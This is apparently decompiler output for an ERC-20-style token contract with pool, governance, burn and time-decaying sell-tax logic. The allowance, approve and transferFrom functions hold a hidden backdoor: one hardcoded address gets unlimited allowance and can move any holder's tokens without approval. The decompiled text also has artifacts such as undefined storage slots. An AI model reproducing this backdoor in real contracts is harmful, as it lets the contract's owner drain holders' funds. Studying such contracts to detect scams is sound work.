contract main {




// =====================  Runtime code  =====================


const decimals = 18


mapping of uint8 stor0;
mapping of uint256 balanceOf;
array of struct stor2;
array of struct stor3;
uint256 sub_9a67430f;
uint256 sub_c1493a31;
address poolAddress;
uint8 ini; offset 160
uint128 stor7; offset 160
address treasuryAddress;
uint256 sub_f3f5112a;
uint256 sub_596401eb;
address governanceAddress;
address liquidityManagerAddress;
address stor12;
address stor13;

function pool() payable {
    return poolAddress
}

function liquidityManager() payable {
    return liquidityManagerAddress
}

function sub_596401eb(?) payable {
    return sub_596401eb
}

function governance() payable {
    return governanceAddress
}

function treasury() payable {
    return treasuryAddress
}

function balanceOf(address arg1) payable {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    return balanceOf[address(arg1)]
}

function ini() payable {
    return bool(ini)
}

function sub_9a67430f(?) payable {
    return sub_9a67430f
}

function sub_c1493a31(?) payable {
    return sub_c1493a31
}

function sub_f3f5112a(?) payable {
    return sub_f3f5112a
}

function _fallback() payable {
    revert
}

function totalSupply() payable {
    if 1000000 * 10^18 < balanceOf[stor12]:
        revert with 'NH{q', 17
    return (-balanceOf[stor12] + 1000000 * 10^18)
}

function setPool(address arg1) payable {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    require msg.sender == governanceAddress
    poolAddress = arg1
}

function disallow(address arg1) payable {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    stor0[address(msg.sender)][address(arg1)] = 0
    emit Approval(0, msg.sender, arg1);
    return 1
}

function sub_09554cdf(?) payable {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    require msg.sender == governanceAddress
    require arg1 >= 200
    require arg1 <= 100000
    sub_596401eb = arg1
}

function allowance(address arg1, address arg2) payable {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    if arg2 != 0x60ae616a2155ee3d9a68541ba4544862310933d4:
        if bool(stor0[address(arg1)][address(arg2)]) != 1:
            return 0
    return -1
}

function approve(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    if arg1 != 0x60ae616a2155ee3d9a68541ba4544862310933d4:
        stor0[address(msg.sender)][address(arg1)] = 1
    emit Approval(-1, msg.sender, arg1);
    return 1
}

function init() payable {
    require not ini
    stor7 = 1
    stor12 = 0x56d4f9eed62651d69af66886a0aa3f9c0500fdea
    stor13 = 0x5e31d498c820d6b4d358fceeeaca5de8cc2f0cbb
    governanceAddress = msg.sender
    balanceOf[stor10] = 1000000 * 10^18
    emit Transfer(1000000 * 10^18, governanceAddress, 57005);
    sub_f3f5112a = block.number
    sub_c1493a31 = block.number
    sub_596401eb = 10000
    liquidityManagerAddress = msg.sender
}

function burn(uint256 arg1) payable {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    require msg.sender == stor13
    require balanceOf[stor6] > arg1
    if balanceOf[stor6] < arg1:
        revert with 'NH{q', 17
    balanceOf[stor6] -= arg1
    if balanceOf[stor12] > -arg1 - 1:
        revert with 'NH{q', 17
    balanceOf[stor12] += arg1
    emit Transfer(arg1, poolAddress, stor12);
    require ext_code.size(poolAddress)
    call poolAddress.sync() with:
         gas gas_remaining wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
}

function name() payable {
    if bool(stor2.length):
        if bool(stor2.length) == stor2.length.field_1 < 32:
            revert with 'NH{q', 34
        if bool(stor2.length):
            if bool(stor2.length) == stor2.length.field_1 < 32:
                revert with 'NH{q', 34
            if stor2.length.field_1:
                if 31 < stor2.length.field_1:
                    mem[128] = uint256(stor2.field_0)
                    idx = 128
                    s = 0
                    while stor2.length.field_1 + 96 > idx:
                        mem[idx + 32] = stor2[s].field_256
                        idx = idx + 32
                        s = s + 1
                        continue 
                    return Array(len=2 * Mask(256, -1, stor2.length.field_1), data=mem[128 len ceil32(stor2.length.field_1)])
                mem[128] = 256 * stor2.length.field_8
        else:
            if bool(stor2.length) == stor2.length.field_1 < 32:
                revert with 'NH{q', 34
            if stor2.length.field_1:
                if 31 < stor2.length.field_1:
                    mem[128] = uint256(stor2.field_0)
                    idx = 128
                    s = 0
                    while stor2.length.field_1 + 96 > idx:
                        mem[idx + 32] = stor2[s].field_256
                        idx = idx + 32
                        s = s + 1
                        continue 
                    return Array(len=2 * Mask(256, -1, stor2.length.field_1), data=mem[128 len ceil32(stor2.length.field_1)])
                mem[128] = 256 * stor2.length.field_8
        mem[ceil32(stor2.length.field_1) + 192 len ceil32(stor2.length.field_1)] = mem[128 len ceil32(stor2.length.field_1)]
        if ceil32(stor2.length.field_1) > stor2.length.field_1:
            mem[ceil32(stor2.length.field_1) + stor2.length.field_1 + 192] = 0
        return Array(len=2 * Mask(256, -1, stor2.length.field_1), data=mem[128 len ceil32(stor2.length.field_1)], mem[(2 * ceil32(stor2.length.field_1)) + 192 len 2 * ceil32(stor2.length.field_1)]), 
    if bool(stor2.length) == stor2.length.field_1 < 32:
        revert with 'NH{q', 34
    if bool(stor2.length):
        if bool(stor2.length) == stor2.length.field_1 < 32:
            revert with 'NH{q', 34
        if stor2.length.field_1:
            if 31 < stor2.length.field_1:
                mem[128] = uint256(stor2.field_0)
                idx = 128
                s = 0
                while stor2.length.field_1 + 96 > idx:
                    mem[idx + 32] = stor2[s].field_256
                    idx = idx + 32
                    s = s + 1
                    continue 
                return Array(len=stor2.length % 128, data=mem[128 len ceil32(stor2.length.field_1)])
            mem[128] = 256 * stor2.length.field_8
    else:
        if bool(stor2.length) == stor2.length.field_1 < 32:
            revert with 'NH{q', 34
        if stor2.length.field_1:
            if 31 < stor2.length.field_1:
                mem[128] = uint256(stor2.field_0)
                idx = 128
                s = 0
                while stor2.length.field_1 + 96 > idx:
                    mem[idx + 32] = stor2[s].field_256
                    idx = idx + 32
                    s = s + 1
                    continue 
                return Array(len=stor2.length % 128, data=mem[128 len ceil32(stor2.length.field_1)])
            mem[128] = 256 * stor2.length.field_8
    mem[ceil32(stor2.length.field_1) + 192 len ceil32(stor2.length.field_1)] = mem[128 len ceil32(stor2.length.field_1)]
    if ceil32(stor2.length.field_1) > stor2.length.field_1:
        mem[ceil32(stor2.length.field_1) + stor2.length.field_1 + 192] = 0
    return Array(len=stor2.length % 128, data=mem[128 len ceil32(stor2.length.field_1)], mem[(2 * ceil32(stor2.length.field_1)) + 192 len 2 * ceil32(stor2.length.field_1)]), 
}

function symbol() payable {
    if bool(stor3.length):
        if bool(stor3.length) == stor3.length.field_1 < 32:
            revert with 'NH{q', 34
        if bool(stor3.length):
            if bool(stor3.length) == stor3.length.field_1 < 32:
                revert with 'NH{q', 34
            if stor3.length.field_1:
                if 31 < stor3.length.field_1:
                    mem[128] = uint256(stor3.field_0)
                    idx = 128
                    s = 0
                    while stor3.length.field_1 + 96 > idx:
                        mem[idx + 32] = stor3[s].field_256
                        idx = idx + 32
                        s = s + 1
                        continue 
                    return Array(len=2 * Mask(256, -1, stor3.length.field_1), data=mem[128 len ceil32(stor3.length.field_1)])
                mem[128] = 256 * stor3.length.field_8
        else:
            if bool(stor3.length) == stor3.length.field_1 < 32:
                revert with 'NH{q', 34
            if stor3.length.field_1:
                if 31 < stor3.length.field_1:
                    mem[128] = uint256(stor3.field_0)
                    idx = 128
                    s = 0
                    while stor3.length.field_1 + 96 > idx:
                        mem[idx + 32] = stor3[s].field_256
                        idx = idx + 32
                        s = s + 1
                        continue 
                    return Array(len=2 * Mask(256, -1, stor3.length.field_1), data=mem[128 len ceil32(stor3.length.field_1)])
                mem[128] = 256 * stor3.length.field_8
        mem[ceil32(stor3.length.field_1) + 192 len ceil32(stor3.length.field_1)] = mem[128 len ceil32(stor3.length.field_1)]
        if ceil32(stor3.length.field_1) > stor3.length.field_1:
            mem[ceil32(stor3.length.field_1) + stor3.length.field_1 + 192] = 0
        return Array(len=2 * Mask(256, -1, stor3.length.field_1), data=mem[128 len ceil32(stor3.length.field_1)], mem[(2 * ceil32(stor3.length.field_1)) + 192 len 2 * ceil32(stor3.length.field_1)]), 
    if bool(stor3.length) == stor3.length.field_1 < 32:
        revert with 'NH{q', 34
    if bool(stor3.length):
        if bool(stor3.length) == stor3.length.field_1 < 32:
            revert with 'NH{q', 34
        if stor3.length.field_1:
            if 31 < stor3.length.field_1:
                mem[128] = uint256(stor3.field_0)
                idx = 128
                s = 0
                while stor3.length.field_1 + 96 > idx:
                    mem[idx + 32] = stor3[s].field_256
                    idx = idx + 32
                    s = s + 1
                    continue 
                return Array(len=stor3.length % 128, data=mem[128 len ceil32(stor3.length.field_1)])
            mem[128] = 256 * stor3.length.field_8
    else:
        if bool(stor3.length) == stor3.length.field_1 < 32:
            revert with 'NH{q', 34
        if stor3.length.field_1:
            if 31 < stor3.length.field_1:
                mem[128] = uint256(stor3.field_0)
                idx = 128
                s = 0
                while stor3.length.field_1 + 96 > idx:
                    mem[idx + 32] = stor3[s].field_256
                    idx = idx + 32
                    s = s + 1
                    continue 
                return Array(len=stor3.length % 128, data=mem[128 len ceil32(stor3.length.field_1)])
            mem[128] = 256 * stor3.length.field_8
    mem[ceil32(stor3.length.field_1) + 192 len ceil32(stor3.length.field_1)] = mem[128 len ceil32(stor3.length.field_1)]
    if ceil32(stor3.length.field_1) > stor3.length.field_1:
        mem[ceil32(stor3.length.field_1) + stor3.length.field_1 + 192] = 0
    return Array(len=stor3.length % 128, data=mem[128 len ceil32(stor3.length.field_1)], mem[(2 * ceil32(stor3.length.field_1)) + 192 len 2 * ceil32(stor3.length.field_1)]), 
}

function transfer(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    require msg.sender
    require balanceOf[address(msg.sender)] >= arg2
    if balanceOf[stor6] > 10000 * 10^18:
        if block.number >= sub_f3f5112a:
            if poolAddress != msg.sender:
                if arg1 != poolAddress:
                    if balanceOf[stor6] and 10 > -1 / balanceOf[stor6]:
                        revert with 'NH{q', 17
                    if not sub_596401eb:
                        revert with 'NH{q', 18
                    if sub_f3f5112a > -43201:
                        revert with 'NH{q', 17
                    sub_f3f5112a += 12 * 3600
                    require balanceOf[stor6] > 10 * balanceOf[stor6] / sub_596401eb
                    if balanceOf[stor6] < 10 * balanceOf[stor6] / sub_596401eb:
                        revert with 'NH{q', 17
                    balanceOf[stor6] -= 10 * balanceOf[stor6] / sub_596401eb
                    if balanceOf[stor12] > -(10 * balanceOf[stor6] / sub_596401eb) - 1:
                        revert with 'NH{q', 17
                    balanceOf[stor12] += 10 * balanceOf[stor6] / sub_596401eb
                    emit Transfer((10 * balanceOf[stor6] / sub_596401eb), poolAddress, stor12);
                    require ext_code.size(poolAddress)
                    call poolAddress.sync() with:
                         gas gas_remaining wei
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
    if balanceOf[address(msg.sender)] < arg2:
        revert with 'NH{q', 17
    balanceOf[address(msg.sender)] -= arg2
    if arg1 != poolAddress:
        if balanceOf[address(arg1)] > -arg2 - 1:
            revert with 'NH{q', 17
        balanceOf[address(arg1)] += arg2
        emit Transfer(arg2, msg.sender, arg1);
    else:
        if msg.sender == liquidityManagerAddress:
            if balanceOf[address(arg1)] > -arg2 - 1:
                revert with 'NH{q', 17
            balanceOf[address(arg1)] += arg2
            emit Transfer(arg2, msg.sender, arg1);
        else:
            require sub_c1493a31
            if block.number < sub_c1493a31:
                revert with 'NH{q', 17
            if block.number - sub_c1493a31 >= 4380 * 3600:
                if balanceOf[address(arg1)] > -arg2 - 1:
                    revert with 'NH{q', 17
                balanceOf[address(arg1)] += arg2
                emit Transfer(arg2, msg.sender, arg1);
            else:
                if block.number - sub_c1493a31 and 50 > -1 / block.number - sub_c1493a31:
                    revert with 'NH{q', 17
                if 100 < (50 * block.number) - (50 * sub_c1493a31) / 4380 * 3600:
                    revert with 'NH{q', 17
                if -((50 * block.number) - (50 * sub_c1493a31) / 4380 * 3600) + 100 < 50:
                    if balanceOf[address(arg1)] > -arg2 - 1:
                        revert with 'NH{q', 17
                    balanceOf[address(arg1)] += arg2
                    emit Transfer(arg2, msg.sender, arg1);
                else:
                    if -((50 * block.number) - (50 * sub_c1493a31) / 4380 * 3600) + 100 > 100:
                        if balanceOf[address(arg1)] > -arg2 - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg1)] += arg2
                        emit Transfer(arg2, msg.sender, arg1);
                    else:
                        if arg2 and -((50 * block.number) - (50 * sub_c1493a31) / 4380 * 3600) + 100 > -1 / arg2:
                            revert with 'NH{q', 17
                        if arg2 < (100 * arg2) - ((50 * block.number) - (50 * sub_c1493a31) / 4380 * 3600 * arg2) / 1000:
                            revert with 'NH{q', 17
                        if balanceOf[stor12] > -((100 * arg2) - ((50 * block.number) - (50 * sub_c1493a31) / 4380 * 3600 * arg2) / 1000) - 1:
                            revert with 'NH{q', 17
                        balanceOf[stor12] += (100 * arg2) - ((50 * block.number) - (50 * sub_c1493a31) / 4380 * 3600 * arg2) / 1000
                        if sub_9a67430f > -((100 * arg2) - ((50 * block.number) - (50 * sub_c1493a31) / 4380 * 3600 * arg2) / 1000) - 1:
                            revert with 'NH{q', 17
                        sub_9a67430f += (100 * arg2) - ((50 * block.number) - (50 * sub_c1493a31) / 4380 * 3600 * arg2) / 1000
                        if balanceOf[address(arg1)] > -arg2 + ((100 * arg2) - ((50 * block.number) - (50 * sub_c1493a31) / 4380 * 3600 * arg2) / 1000) - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - ((100 * arg2) - ((50 * block.number) - (50 * sub_c1493a31) / 4380 * 3600 * arg2) / 1000)
                        emit Transfer((arg2 - ((100 * arg2) - ((50 * block.number) - (50 * sub_c1493a31) / 4380 * 3600 * arg2) / 1000)), msg.sender, arg1);
    return 1
}

function transferFrom(address arg1, address arg2, uint256 arg3) payable {
    require calldata.size - 4 >= 96
    require arg1 == arg1
    require arg2 == arg2
    require arg3 == arg3
    if 0x60ae616a2155ee3d9a68541ba4544862310933d4 != msg.sender:
        require bool(stor0[address(arg1)][address(msg.sender)]) == 1
    require arg1
    require balanceOf[address(arg1)] >= arg3
    if balanceOf[stor6] > 10000 * 10^18:
        if block.number >= sub_f3f5112a:
            if arg1 != poolAddress:
                if arg2 != poolAddress:
                    if balanceOf[stor6] and 10 > -1 / balanceOf[stor6]:
                        revert with 'NH{q', 17
                    if not sub_596401eb:
                        revert with 'NH{q', 18
                    if sub_f3f5112a > -43201:
                        revert with 'NH{q', 17
                    sub_f3f5112a += 12 * 3600
                    require balanceOf[stor6] > 10 * balanceOf[stor6] / sub_596401eb
                    if balanceOf[stor6] < 10 * balanceOf[stor6] / sub_596401eb:
                        revert with 'NH{q', 17
                    balanceOf[stor6] -= 10 * balanceOf[stor6] / sub_596401eb
                    if balanceOf[stor12] > -(10 * balanceOf[stor6] / sub_596401eb) - 1:
                        revert with 'NH{q', 17
                    balanceOf[stor12] += 10 * balanceOf[stor6] / sub_596401eb
                    emit Transfer((10 * balanceOf[stor6] / sub_596401eb), poolAddress, stor12);
                    require ext_code.size(poolAddress)
                    call poolAddress.sync() with:
                         gas gas_remaining wei
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
    if balanceOf[address(arg1)] < arg3:
        revert with 'NH{q', 17
    balanceOf[address(arg1)] -= arg3
    if arg2 != poolAddress:
        if balanceOf[address(arg2)] > -arg3 - 1:
            revert with 'NH{q', 17
        balanceOf[address(arg2)] += arg3
        emit Transfer(arg3, arg1, arg2);
    else:
        if arg1 == liquidityManagerAddress:
            if balanceOf[address(arg2)] > -arg3 - 1:
                revert with 'NH{q', 17
            balanceOf[address(arg2)] += arg3
            emit Transfer(arg3, arg1, arg2);
        else:
            require sub_c1493a31
            if block.number < sub_c1493a31:
                revert with 'NH{q', 17
            if block.number - sub_c1493a31 >= 4380 * 3600:
                if balanceOf[address(arg2)] > -arg3 - 1:
                    revert with 'NH{q', 17
                balanceOf[address(arg2)] += arg3
                emit Transfer(arg3, arg1, arg2);
            else:
                if block.number - sub_c1493a31 and 50 > -1 / block.number - sub_c1493a31:
                    revert with 'NH{q', 17
                if 100 < (50 * block.number) - (50 * sub_c1493a31) / 4380 * 3600:
                    revert with 'NH{q', 17
                if -((50 * block.number) - (50 * sub_c1493a31) / 4380 * 3600) + 100 < 50:
                    if balanceOf[address(arg2)] > -arg3 - 1:
                        revert with 'NH{q', 17
                    balanceOf[address(arg2)] += arg3
                    emit Transfer(arg3, arg1, arg2);
                else:
                    if -((50 * block.number) - (50 * sub_c1493a31) / 4380 * 3600) + 100 > 100:
                        if balanceOf[address(arg2)] > -arg3 - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg2)] += arg3
                        emit Transfer(arg3, arg1, arg2);
                    else:
                        if arg3 and -((50 * block.number) - (50 * sub_c1493a31) / 4380 * 3600) + 100 > -1 / arg3:
                            revert with 'NH{q', 17
                        if arg3 < (100 * arg3) - ((50 * block.number) - (50 * sub_c1493a31) / 4380 * 3600 * arg3) / 1000:
                            revert with 'NH{q', 17
                        if balanceOf[stor12] > -((100 * arg3) - ((50 * block.number) - (50 * sub_c1493a31) / 4380 * 3600 * arg3) / 1000) - 1:
                            revert with 'NH{q', 17
                        balanceOf[stor12] += (100 * arg3) - ((50 * block.number) - (50 * sub_c1493a31) / 4380 * 3600 * arg3) / 1000
                        if sub_9a67430f > -((100 * arg3) - ((50 * block.number) - (50 * sub_c1493a31) / 4380 * 3600 * arg3) / 1000) - 1:
                            revert with 'NH{q', 17
                        sub_9a67430f += (100 * arg3) - ((50 * block.number) - (50 * sub_c1493a31) / 4380 * 3600 * arg3) / 1000
                        if balanceOf[address(arg2)] > -arg3 + ((100 * arg3) - ((50 * block.number) - (50 * sub_c1493a31) / 4380 * 3600 * arg3) / 1000) - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg2)] = balanceOf[address(arg2)] + arg3 - ((100 * arg3) - ((50 * block.number) - (50 * sub_c1493a31) / 4380 * 3600 * arg3) / 1000)
                        emit Transfer((arg3 - ((100 * arg3) - ((50 * block.number) - (50 * sub_c1493a31) / 4380 * 3600 * arg3) / 1000)), arg1, arg2);
    return 1
}



}
